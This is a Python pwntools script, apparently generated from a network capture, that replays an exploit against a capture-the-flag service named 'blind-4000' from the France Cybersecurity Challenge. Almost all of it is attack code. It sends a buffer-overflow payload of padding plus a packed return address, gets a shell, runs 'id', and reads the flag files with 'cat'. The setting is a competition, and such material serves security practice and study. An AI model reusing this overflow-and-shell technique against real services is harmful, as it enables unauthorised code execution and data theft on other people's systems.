#!/usr/bin/env python3
# Filename: replay-blind-4000-1072027433827877.py
import json
import os

from pwn import *

"""
This file was generated from network capture towards 10.0.2.2 (TCP).
Corresponding flow id: 1072027433827877
Service: blind-4000
"""

# Set logging level
context.log_level = "INFO"  # DEBUG or INFO, WARNING, ERROR

HOST, PORT = "challenges.france-cybersecurity-challenge.fr", 2111

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
r = remote(HOST, PORT, typ="tcp", timeout=2)

# FIXME: You should identify if a flag_id was used in the following
# payload. If it is the case, then you should loop using EXTRA.
# for flag_id in EXTRA:
data = r.recvuntil(b'e note summary.\n')
r.sendline(b'n')
data = r.recvuntil(b'rX4rq\nContent: \n')
r.sendline(b'eA7Oi6rUBzMD4JeWzNxcdhgdMNOUCkHhpwKpnxiBui0VJK2BbjTLtS9Lqvlv86v6M66dAAmdSZoLZc7EiMtXn0nd42cmrE9WmhjEA5yvXemfMnR0rkgZrW8lO81VvZiuaw9nXnbxe2351aoM7vMCaiBT46bri1SVS7NWJRgLmmZyoMuiAHwwWKPUNsgANWgjX4uLJV2VpU39uNEa7nEqMYcNSB9l29LNzb6Ypda0\xe5\x16@\x00\x00\x00\x00\x00')
r.sendline(b'id')
data = r.recvuntil(b'groups=101(ctf)\n')

'''
r.interactive()

cat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*
'''

r.sendline(b'cat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*')
data = r.recvuntil(b'\x00')
print(data)

r.close()
